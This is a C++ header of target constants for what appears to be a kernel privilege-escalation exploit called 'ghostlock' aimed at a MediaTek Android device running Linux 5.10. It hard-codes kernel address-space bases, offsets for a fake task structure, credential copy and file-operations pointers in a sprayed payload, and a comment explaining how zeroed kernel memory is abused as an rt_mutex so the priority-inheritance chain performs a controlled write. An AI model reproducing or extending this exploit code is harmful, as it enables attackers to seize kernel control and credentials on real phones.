#ifndef GHOSTLOCK_TARGET_CONSTANTS_HPP
#define GHOSTLOCK_TARGET_CONSTANTS_HPP

#include <cstddef>
#include <cstdint>
#include <limits>
#include <optional>
#include <type_traits>

namespace ghostlock::target {
    namespace address {
        inline constexpr std::uintptr_t kImageTextBase = 0xffffffc080000000ULL;
        inline constexpr std::uintptr_t kMtkVirtualBase = 0xffffffc000000000ULL;
        inline constexpr std::uintptr_t kPageOffset = 0xffffff8000000000ULL;
        inline constexpr std::uintptr_t kPhysicalOffset = 0x80000000ULL;
        inline constexpr std::uintptr_t kKernelSnitchIdentityStart =
                0xffffff8000000000ULL;
        inline constexpr std::uintptr_t kKernelSnitchIdentityEnd =
                0xffffff8c00000000ULL;
        inline constexpr std::uintptr_t kDirectMapBase = 0xffffff8000000000ULL;
        inline constexpr std::uintptr_t kDirectMapEnd = 0xffffff9000000000ULL;
        inline constexpr std::uintptr_t kVmemmapStart = 0xfffffffe00000000ULL;
    } // namespace address

    namespace payload {
        inline constexpr std::size_t kLockOffset = 0x0e80;
        inline constexpr std::size_t kWaiterOffset = 0x1180;
        inline constexpr std::size_t kFileOperationsOffset = 0x0f80;
        inline constexpr std::size_t kRightNodeOffset = 0x1240;
        inline constexpr std::size_t kLeftNodeOffset = 0x1260;
        inline constexpr std::size_t kFakeTaskOffset = 0x1280;
        inline constexpr std::size_t kCredentialCopyOffset = 0x1080;
        inline constexpr std::size_t kTcpFakeTaskOffset = 0x5800;
        inline constexpr std::size_t kTcpCredentialCopyOffset = 0x6800;
    } // namespace payload

    namespace zero_lock {
        /* SO-54C CLI-verified safe zero zone (init_pg_end .. _end, symbol-free
         * per symbols.txt): 0xffffffc00aa86000 .. 0xffffffc00aa8a000, 16 KiB.
         * A zeroed slot IS a valid rt_mutex: wait_lock=0 (unlocked qspinlock),
         * waiters root=NULL, rb_leftmost=NULL, owner=NULL. adjust_prio_chain on
         * such a lock is deterministic: [7] requeue inserts the stamped waiter
         * as a black root on the empty tree, [9] sees owner==NULL and exits
         * right after the write — no descent of a planted W0 tree, no fake_task
         * walk, nothing left on the (gambled) spray page. This is the reference
         * mt6896 (5.10.136) design: zero-page lock pool + ghost task=init_task.
         * Slots are consumed once (the chain dirties root+leftmost) and banked
         * by pid so a restarted process cannot replay a dead slot. */
        inline constexpr std::uintptr_t kZoneBase = 0xffffffc00aa86000ULL;
        inline constexpr std::uintptr_t kZoneEnd = 0xffffffc00aa8a000ULL;
        inline constexpr std::size_t kSlotStride = 0x20;
        inline constexpr std::size_t kBankStride = 0x800;
        inline constexpr std::size_t kZoneSize = static_cast<std::size_t>(kZoneEnd - kZoneBase);
        inline constexpr std::size_t kBankCount = kZoneSize / kBankStride;
        inline constexpr std::size_t kSlotsPerBank = kBankStride / kSlotStride;
    } // namespace zero_lock

    template<typename Domain>
    class KernelAddress final {
    public:
        constexpr KernelAddress() noexcept = default;

        explicit constexpr KernelAddress(std::uintptr_t value) noexcept
            : value_(value) {
        }

        [[nodiscard]] constexpr std::uintptr_t value() const noexcept {
            return value_;
        }

        [[nodiscard]] constexpr std::optional<KernelAddress> checked_add(
            std::uintptr_t offset) const noexcept {
            if (offset > std::numeric_limits<std::uintptr_t>::max() - value_) {
                return std::nullopt;
            }
            return KernelAddress(value_ + offset);
        }

        friend constexpr bool operator==(KernelAddress, KernelAddress) = default;

    private:
        std::uintptr_t value_ = 0;
    };

    struct ImageAddressDomain final {
    };

    struct DirectMapAddressDomain final {
    };

    struct PhysicalAddressDomain final {
    };

    static_assert(std::is_standard_layout_v<KernelAddress<ImageAddressDomain> >);
    static_assert(std::is_trivially_copyable_v<KernelAddress<ImageAddressDomain> >);
    static_assert(sizeof(KernelAddress<ImageAddressDomain>) == sizeof(std::uintptr_t));
    static_assert(alignof(KernelAddress<ImageAddressDomain>) == alignof(std::uintptr_t));

    static_assert(address::kImageTextBase == 0xffffffc080000000ULL);
    static_assert(address::kMtkVirtualBase == 0xffffffc000000000ULL);
    static_assert(address::kPageOffset == address::kDirectMapBase);
    static_assert(address::kKernelSnitchIdentityStart == address::kDirectMapBase);
    static_assert(address::kKernelSnitchIdentityEnd < address::kDirectMapEnd);
    static_assert(payload::kLockOffset == 0x0e80);
    static_assert(payload::kFileOperationsOffset == 0x0f80);
    static_assert(payload::kCredentialCopyOffset == 0x1080);
    static_assert(payload::kWaiterOffset == 0x1180);
    static_assert(payload::kRightNodeOffset == 0x1240);
    static_assert(payload::kLeftNodeOffset == 0x1260);
    static_assert(payload::kFakeTaskOffset == 0x1280);
    static_assert(payload::kTcpFakeTaskOffset == 0x5800);
    static_assert(payload::kTcpCredentialCopyOffset == 0x6800);
    static_assert(zero_lock::kZoneSize == 0x4000);
    static_assert(zero_lock::kBankCount == 8);
    static_assert(zero_lock::kSlotsPerBank == 64);
} // namespace ghostlock::target

#endif
